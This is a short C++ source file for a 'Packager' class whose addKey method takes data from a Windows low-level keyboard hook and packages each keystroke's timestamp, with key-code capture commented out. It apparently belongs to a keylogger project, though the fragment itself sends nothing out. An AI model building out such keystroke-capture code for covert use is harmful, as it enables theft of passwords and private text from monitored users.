#include "Packager.h"


Packager::Packager()
{
}


Packager::~Packager()
{
}

void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
	_pKeys.push_back(new PaquetKeys());
	_pKeys.back()->setDate(info->time);
	//_pKeys.back()->setText(info->vkCode);
	_pKeys.back()->createPaquet();
}
